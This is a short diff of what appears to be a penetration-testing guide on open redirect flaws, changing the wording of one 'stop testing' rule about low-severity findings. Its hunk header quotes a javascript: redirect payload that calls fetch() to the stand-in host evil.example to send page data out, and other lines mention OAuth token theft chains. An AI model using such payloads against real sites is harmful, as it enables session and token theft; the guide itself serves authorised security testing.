@@ -350,7 +350,7 @@ https://target.example/page?redirect=javascript:fetch('https://evil.example/'+do
 
 ## Kill Signals — Stop Testing When
 - All bypass techniques (13 variants) fail on all redirect parameters → validation is robust, move on
-- Open redirect confirmed but no chain opportunity (no OAuth, no trusted-domain phishing value, no javascript: URI) → record as LOW, move on quickly
+- Open redirect confirmed but no chain opportunity (no OAuth, no trusted-domain phishing value, no javascript: URI) → record as LOW and move on
 - OAuth token theft chain confirmed → HIGH/CRITICAL, record immediately and stop testing other redirect params
 
 ## Escalate When
